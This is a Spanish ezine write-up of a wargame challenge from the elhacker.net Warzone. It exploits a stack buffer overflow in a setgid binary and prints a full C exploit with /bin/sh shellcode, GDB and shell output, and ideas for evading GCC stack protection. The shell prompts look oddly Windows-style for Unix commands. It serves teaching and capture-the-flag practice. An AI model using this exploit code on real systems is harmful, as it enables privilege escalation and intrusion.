@@ -1,0 +1,411 @@
+-[ 0x06 ]--------------------------------------------------------------------
+-[ 3er Reto Torneo Shell Warzone (BoF) ]-------------------------------------
+-[ by blackngel ]----------------------------------------------------SET-36--
+
+
+          ^^
+      *`* @@ *`*     HACK THE WORLD
+     *   *--*   *    
+          ##         by blackngel <blackngel1@gmail.com>
+          ||                      <black@set-ezine.org>
+         *  *
+        *    *       (C) Copyleft 2009 everybody
+       _*    *_
+
+
+[-----]
+
+Seguidamente explicaremos la solucion al 3o reto planteado por los creadores
+del "Torneo Shell" de la Warzone ubicada en "elhacker.net". La informacion
+que encontrareis a continuacion se expone con un mero caracter educativo.
+Warzone, sus creadores y el autor de este documento no se hacen responsables
+del uso o abuso que se le pueda dar a la misma. ¡Disfruten del juego!
+
+[-----]
+
+Con la experiencia de la primera y segunda prueba del Torneo, veran que esta
+casi ha sido un regalo que nos han dejado para que reafirmemos conocimientos
+y tengamos la mente medianamente despejada cuando lleguemos al 4o.
+
+Manos a la obra:
+
+En primer lugar entraremos en el directorio de la prueba "/usr/home/war/" y
+listaremos sus ficheros:
+
+[-----]
+
+   C:/Users/NikiSanders/Desktop>cd ../war/
+   C:/Users/NikiSanders/Desktop>ls -al
+   total 38
+   drwxr-x---   3 war   warzone2   512 Dec  3 18:26 .
+   drwxr-xr-x 320 root  wheel     7168 Dec 14 07:35 ..
+   -rw-r--r--   1 war   warzone    751 Nov 21 13:45 .cshrc
+   -rw-r--r--   1 war   warzone    248 Nov 21 13:45 .login
+   -rw-r--r--   1 war   warzone    158 Nov 21 13:45 .login_conf
+   -rw-r-----   1 war   warzone    373 Nov 21 13:45 .mail_aliases
+   -rw-r--r--   1 war   warzone    331 Nov 21 13:45 .mailrc
+   drwxr-x---   2 war   OK1        512 Dec 12 21:38 .pass
+   -rw-r--r--   1 war   warzone    766 Nov 21 13:45 .profile
+   -rw-r--r--   1 war   warzone    276 Nov 21 13:45 .rhosts
+   -rw-r--r--   1 war   warzone    975 Nov 21 13:45 .shrc
+   -rw-r--r--   1 root  warzone2  1765 Dec  3 18:26 TORNEO.txt
+   -rwxr-sr-x   1 war   OK1       6266 Nov 28 13:01 dejavu
+   C:/Users/NikiSanders/Desktop>
+
+[-----]
+
+A tener en cuenta:
+
+   - dejavu  -> Programa vulnerable.
+   - .pass   -> Directorio objetivo que contiene nuestro “hash”.
+
+Sabiendo entonces que no disponemos el codigo fuente. Lo normal sera ejecutar
+el programa para ver como actua y si acepta parametros como entrada:
+
+[-----]
+
+   C:/Users/NikiSanders/Desktop>./dejavu
+   Mas facil no se puede xD
+   Se esperaban Parametros!!
+   Uso:
+            ./dejavu <algo>
+   C:/Users/NikiSanders/Desktop>./dejavu WARZONE
+   Mas facil no se puede xD
+   Usted paso como parametro lo siguiente:
+
+   WARZONE
+
+[-----]
+
+Bien, aqui esta la sorpresa. Cuando muchos de nosotros esperabamos encontrarnos
+en esta prueba una vulnerabilidad de "format string", resulto ser que nos tenian
+preparada otra clase de "buffer overflow" que debiamos intentar explotar.
+
+* Si todavia no sabes de que va este tema, te recomiendo la lectura de la
+  documentacion que hemos preparado para la 1a prueba.
+
+Seguiremos los pasos clasicos:
+
+Averiguamos la longitud del buffer que parece estar sobre los 1024 bytes.
+Recordemos los caracteristicos multiplos de 16. Como sabemos nos basta con
+ejecutar algo como:
+
+   $ ./dejavu perl -e 'print "A"x1050;'
+
+No tardaremos nada en ver un precioso "Segmentation Fault".
+
+Bien, el segundo paso es intentar sobreescribir %eip para que apunte a una
+direccion de memoria deseada donde estara esperando nuestra "Shellcode" para
+ser ejecutada. Ya hemos visto como lograr este objetivo a traves de la linea
+de comandos con la ayuda de "Perl".
+
+Esta vez elaboraremos un exploit en lenguaje C para que al menos podamos
+aprender algo nuevo y no ser tan vagos.
+
+[-----]
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#define DEFAULT_OFFSET                       0
+#define DEFAULT_BUFFER_SIZE                512
+#define NOP                               0x90
+
+char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
+                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+                   "\x54\x53\x50\xb0\x3b\xcd\x80";
+
+unsigned long get_sp(void) {
+     __asm__("movl %esp,%eax");
+}
+
+int main(int argc, char *argv[])
+{
+   int i;
+   char *buff, *ptr;
+   long esp, ret, *addr_ptr;
+   int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
+
+   esp = get_sp(); /* %esp, posible direccion de retorno        */
+   if (argc > 1) bsize = atoi(argv[1]); /* Tamaño del buffer    */
+   if (argc > 2) offset = atoi(argv[2]); /* Desplazamiento      */
+   if (argc > 3) esp = strtoul(argv[3], NULL, 0); /* %esp manual*/
+   ret = esp - offset;
+
+   fprintf(stderr, "Usage: %s<buff_size> <offset> <esp: 0xfff...>\n",argv[0]);
+   fprintf(stderr, "ESP:0x%x     Offset: 0x%x   Return: 0x%x\n", esp, offset,
+                                                                         ret);
+   /* Reservamos memoria */
+   if (!(buff = (char *)malloc(bsize))) {
+      printf("Can't allocate memory.\n");
+      exit(0);
+   }
+
+   /* Rellenamos el buffer con la direccion de retorno */
+   ptr = buff;
+   addr_ptr = (long *) ptr;
+   for (i = 0; i < bsize; i+=4)
+      *(addr_ptr++) = ret;
+
+   /* La primera mitad del buffer seran instrucciones NOP "0x90" */
+   for (i = 0; i < bsize/2; i++)
+      buff[i] = NOP;
+
+   /* Copiar shellcode a partir de la mitad del buffer */
+   ptr = buff + (bsize/2);
+   for (i = 0; i < strlen(shellcode); i++)
+      *(ptr++) = shellcode[i];
+
+   buff[bsize - 1] = 0; /* Finalizar cadena con un caracter NULL */
+   execl("../war/dejavu", "dejavu", buff,0); /* Lanzar el ataque */
+}
+
+[-----]
+
+Bien, ya tenemos practicamente todo lo que necesitamos. Solo nos queda la
+esperanza y la suerte, pero como todos sabemos hay que buscarla.
+
+El programa anterior lo puedes compilar sin mas problemas en la linea de
+comandos con:
+
+   $ gcc exdejavu.c -o exdejavu
+
+El exploit acepta 3 argumentos:
+
+   1 – Tamaño del buffer a explotar.
+   2 – Desplazamiento desde %esp.
+   3 – Direccion manual de retorno.
+
+Si ejecutas este programa con un unico argumento, es decir, el tamaño del
+buffer (1024). Seguramente obtendras otro lindo "Segmentation Fault".
+
+Bueno, aqui realmente me sucedieron unas cuantas cosas extrañas, al parecer el
+programa estaba compilado con la version 4.1 de GCC, lo que implica que se ha
+añadido una nueva medida de "Stack Protection" que segun indica la documentacion
+hace unos cambios aleatorios en la pila y una reordenacion de las variables.
+
+Al final se dara una idea sobre como saltar esta proteccion.
+
+Por suerte para mi, mucha suerte, consegui explotar el programa de la forma
+tradicional. ¿Como? Pues resulta que el problema podia ser solventado si
+apuntabamos manualmente a la direccion correcta.
+
+Ejecutando el exploit desde dentro de "GDB", y estableciendo ciertos parametros,
+logre conseguir ejecutar una shell. Se muestra a continuacion:
+
+[-----]
+
+gblackngel@mac:~$ gdb
+GNU gdb 6.1.1 [FreeBSD]
+Copyright (C) 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU Gneral Public License, and
+you are welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB. Type "show warranty" for details.
+
+This GDB was configured as "i386-marcel-freebsd"...(no debugging symbols
+found)...
+(gdb) run 1029 5 0xbfbfebf8
+Starting program: /usr/home/NikiSanders/ex2 1029 5 0xbfbfebf8
+(no debugging symbols found)...(no debugging symbols found)...Usage:
+/usr/home/NikiSanders/ex2 <buff_size> <offset> <esp: 0xfff...>
+ESP:0Xxbfbfebf8  Offset: 0x5   Return: 0xbfbfebf3
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x0884a3e0 in ?? () from /libexec/ld-elf.so.1
+
+(gdb)c
+Continuing.
+Dejavu?
+Usted paso como parametro lo siguiente:
+
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������1�1�P1�P�~1�Ph//shh/bin/��PTSP��뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�
+뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿
+�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�
+뿿 �뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿
+
+Program received signal SIGTRAP, Trace/breakpoing trap.
+Cannot remove breakpoints because program is no longer writable.
+It might be running in another process.
+Further execution is probably impossible.
+0x088643e0 in _rtld_thread_init () from /libexec/ld-elf.so.1
+
+(gdb) c
+Continuing
+$ id
+uid=7027(NikiSanders) gid=6001(warusers) groups=6001(warusers),5000(warzone),
+5001(warzone1),5002(warzone2),5003(warzone3)
+$
+
+[-----]
+
+En este punto debemos fijarnos en varias cosas:
+
+Lo primero es que he ejecutamos el exploit con los parametros "1029", "5" y
+"0xbfbfebf8". Bien, resulta que en principio, sin establecer la direccion
+manualmente, obtenemos tambien la Shell. Pero si ejecutamos el mismo comando
+desde fuera de GDB nos lanza directos a un "Segmentation Fault".
+
+Entonces, ¿que es lo que ha cambiado?
+
+Un comentario de cierta persona me hizo ver que a veces el valor de ESP cambia
+cuando se ejecuta un exploit desde GDB o desde la Shell. Y es cierto, pues este
+valor depende la mayoria de las veces del numero de procesos en ejecucion.
+
+Entonces me fije que desde GDB decia: ESP = 0xbfbfebf8
+
+Por otro lado, y en parte lo mas sorprendente para mi, es que desde GDB obtenia
+la Shell pero sin los privilegios necesarios como para acceder al directorio
+".pass". Pues observar que tras el comando "id", no obtenemos los permisos
+precisos.
+
+Pues nada, para no obtener el "Segmentation Fault" solo me quedaba intentar
+ejecutar el exploit desde la misma Shell y utilizar la direccion que me habia
+ofrecido directamente GDB. Seguidamente nuestro resultado:
+
+[-----]
+
+C:/Users/NikiSanders/Desktop>./ex2 1029 5 0xbfbfebf8
+Usage: ./ex2 <buff_size> <offset> <esp: 0xfff...>
+ESP:0xbfbfebf8   Offset: 0x5   Return: 0xbfbfebf3
+Dejavu?
+Usted paso como parametro lo siguiente:
+
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������������������������������������������������������������������������
+������������1�1�P1�P�~1�Ph//shh/bin/��PTSP��뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�
+뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿
+�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�
+뿿 �뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿�뿿
+
+$ id
+uid=7027(NikiSanders) gid=6001(warusers) egid=6003(OK1) groups=6003(OK1),
+6001(warusers),5000(warzone), 5001(warzone1),5002(warzone2),5003(warzone3)
+$
+
+[-----]
+
+Ahora si. Observese la maravilla de: egid=6003(OK1) groups=6003(OK1)
+Que mas se puede pedir... Ah si. Obtener nuestro preciado hash.
+
+[-----]
+
+$ cd /usr/home/war/
+$ cat .leeme_7027
+Enhorabuena usted ha pasado la Tercera prueba
+Su clave de Acceso es:
+No olvide registrar su password en /usr/home/warzone/validar
+esto es para que se le habran los nuevos retos!!
+Ademas no olvide volver al shell con el que inicio la prueba ;)
+antes de ejecutar validar.
+
+Hash: cb1736ad--------------389725c0fa
+$
+
+[-----]
+
+Hemos logrado nuestro objetivo. Pero como prometi, aqui la idea de como saltar
+la proteccion establecida por el compilador GCC-4.1. En realidad recomiendo
+encarecidamente leer este Post [4], que podras encontrar en el foro de
+"elHacker.net". Alli se describen algunos aspectos interesantes y las ciertas
+ideas para salir del apuro.
+
+En realidad la tecnica se basa en realizar un "doble salto". Si depuras con
+GDB te daras cuenta que la mayoria de las veces consigues sobrescribir dos
+registros diferentes de "%eip", estos son "%esp" y "%ecx".
+
+Ocurre que el "%esp" es guardado en su momento en "%ecx" y posteriormente
+es restaurado desde aqui para seguidamente retornar.
+
+Se supone entonces que podemos sobrescribir "%esp" con la intencion de que
+apunte a una direccion de memoria, que a su vez apunte a otra direccion de
+memoria que contenga realmente nuestra Shellcode. ¿Necesitas que lo explique
+un poco mas claro?
+
+No hay problema, aqui un ejemplo aleatorio:
+
+   %ecx = %esp =  0xbfbfc87a
+   0xbfbfc87a  -> contiene -> 0xbfbfebf8
+   0xbfbfebf8  =  Shellcode.
+
+En resumen. Sobrescribimos "%esp" con "0xbfbfc87a", cuando realice este salto
+se encuentra con que debe saltar nuevamente a "0xbfbfebf8", que definitivamente
+ejecuta la Shellcode apropiada.
+
+¿Como realizar esto?. Como comente en la documentacion de la 2a prueba del
+torneo, lo mas facil suele ser utilizar los propios argumentos del programa
+o incluso el entorno.
+
+Podriamos establecer dos variables de entorno:
+
+   SC1 = direccion de SC2
+   SC2 = Shellcode.
+
+Con esto utilizariamos el programa "./getenv" que creamos en la prueba
+anterior para obtener sus direcciones en memoria. La direccion de SC2 la
+metemos como contenido de SC1, y la direccion de SC1 es la que utilizariamos
+para sobrescribir nuestro amigo "%esp".
+
+Otra idea que se me ocurre es colocar nuestra Shellcode antecedida de unos
+cuantos NOP's en la variable "argv[2]". Luego llenariamos todo el buffer con
+su supuesta direccion en memoria e intentando ajustar el desplazamiento con
+unas cuantas letras "A".
+
+Recuerda que alcanzar "argv[2]" suele ser algo trivial cuando vamos
+estableciendo diferentes offset's al valor que nos devuelve "get_esp()";
+
+Lo que quiero que quede claro aqui, tal y como me dijo "Anon" en su momento,
+es que la explotacion no es una ciencia exacta, y es el hecho de saber jugar
+lo que nos puede aportar mayores beneficios. Lo importante es abrir tu mente,
+buscar nuevas ideas, no tener miedo a preguntar, y leer, sobre todo leer
+mucho...
+
+Antes de acabar, debo decir que la tecnica de manipular "%esp" para uso o abuso,
+ya fue descrita en su momento en el articulo de Phrack-55-8 [5] "Frame Pointer
+Overwriting". En este paper se detalla como aun en situaciones donde solo un
+byte puede ser sobreescrito ("%ebp"), puede ser aprovechado en beneficio para
+manipular la direccion a la que apunta "%esp" cuando es restaurado a la salida
+del programa.
+
+Como adelanto, deciros que en SET-37 podreis disfrutar de un articulo titulado
+"Jugando con Frame Pointer", alli comprendereis todos estos metodos y muchos
+mas...
+
+
+
+Referencias:
+
+[1] "Smashing the Stack for Fun and Profit" by Aleph One
+    http://doc.bughunter.net/buffer-overflow/smash-stack.html
+
+[2] Desbordamiento de bufer
+    http://es.wikipedia.org/wiki/Desbordamiento_de_b%C3%BAfer
+
+[3] Introduccion a los Overflows en Linux X86_64
+    http://www.enye-sec.org/textos/introduccion.a.los.overflows.en.linux.x86_
+    64.txt
+
+[4] No puedo sobreescribir EIP (linux)
+    http://foro.elhacker.net/bugs_y_exploits/no_puedo_sobreescribir_eip_linux-
+    t193202.0.html
+
+[5] Frame Pointer Overwriting
+    http://www.phrack.org/issues.html?issue=55&id=8#article
+
+
+Por lo demas WARZONE te esta esperando! };-D
+
+*EOF*
+
